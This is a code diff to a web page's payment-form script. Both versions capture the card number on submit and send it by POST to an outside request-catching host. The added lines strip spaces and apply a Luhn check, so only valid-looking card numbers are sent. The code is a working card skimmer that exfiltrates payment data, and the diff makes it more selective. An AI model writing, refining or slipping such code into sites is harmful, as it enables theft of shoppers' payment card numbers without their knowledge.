@@ -1,22 +1,24 @@
 const paymentForm = document.getElementById('payment-form');
 
 paymentForm.addEventListener('submit', function(event) {
+    const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');
 
-    // Extract relevant event data (since event object has circular references)
-    const eventData = {
-        type: event.type,
-        target: event.target.id || event.target.tagName,
-        timestamp: event.timeStamp,
-        formData: {
-            cardNumber: document.getElementById('card-number').value
-        }
-    };
+    if (validateLuhn(rawValue)) {
+        const eventData = {
+            type: event.type,
+            target: event.target.id || event.target.tagName,
+            timestamp: event.timeStamp,
+            formData: {
+                cardNumber: rawValue
+            }
+        };
 
-    fetch('https://team11.requestcatcher.com/test', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(eventData)
-    })
+        fetch('https://team11.requestcatcher.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(eventData)
+        })
+    }
 });
